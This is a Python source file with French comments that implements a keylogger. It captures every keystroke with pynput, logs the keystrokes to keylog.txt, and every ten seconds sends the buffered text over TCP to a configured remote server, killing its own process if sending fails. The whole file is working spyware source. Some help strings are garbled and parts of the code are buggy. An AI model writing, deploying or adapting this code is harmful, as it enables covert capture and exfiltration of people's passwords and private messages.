import signal

from env import *

import argparse
import socket
import time
import threading
import os
import re
from pynput.keyboard import Key, Listener


def argument():
    p = argparse.ArgumentParser(description='Ajouter description')
    p.add_argument('-p', '--ping', action='store_true', help='Faffs UP')
    p.add_argument('-s', '--socket',type=all, help="ffffles 100 premiers ports")
    p.add_argument('-o', action='store_true', help='Enregifer')
    args = p.parse_args()
    return args



TXT_GLOB = ""


def pav_num():

    touche = {

        "<96>": "0",
        "<97>": "1",
        "<98>": "2",
        "<99>": "3",
        "<100>": "4",
        "<101>": "5",
        "<102>": "6",
        "<103>": "7",
        "<104>": "8",
        "<105>": "9",
        "<110>": "."
    }
    return touche


def kill_all():

    pid = os.getpid()
    os.kill(pid, 9)


def parse(srt):

    pattern = r'<\d+>'

    new_str = srt.replace("'", "")
    new_str = new_str.replace("Key.space"," ")
    new_str = new_str.replace("Key.backspace","<-")
    new_str = new_str.replace("Key.enter","\n")
    new_str = new_str.replace("Key.shift_r", "")
    if re.match(pattern, new_str):
        nombre = pav_num()
        new_str = nombre.get(new_str, "-1")
    return new_str

def kpr(key):
        global TXT_GLOB
        with open("keylog.txt", "a") as f:
            f.write(parse(str(key)))
            TXT_GLOB += parse(str(key))

def scan_socket():
    try :
        rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP

        rsocket.settimeout(0.5)  # définition du temps d'attente de la réponse

        rsocket.connect((SRV, PORT))
        print("Toujours Co !!")
    except :
        print("Pas Co !!")
        #kill_all()

def chrono():
    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            scan_socket()
            time.sleep(1)
            if seconds % 10 == 0 :
                send_t = threading.Thread(target=send(TXT_GLOB))
                send_t.start()
                #print(TXT_GLOB)
                TXT_GLOB = ""
            if seconds == 600 :
                return 0

def keylogger():
    with Listener(on_press=kpr) as listener:
        listener.join()


def send(data):
    try :
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket.connect((SRV, PORT))

        client_socket.send(data.encode('utf-8')) ##envoi

        client_socket.close()
    except :
        kill_all()

    #print(data)


def commands(cmd):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, PORT))

    client_socket.send(cmd.encode('utf-8'))  ##envoi

    client_socket.close()










chrono_t = threading.Thread(target=chrono)

chrono_t.start()


keylog_t = threading.Thread(target=keylogger)

keylog_t.start()










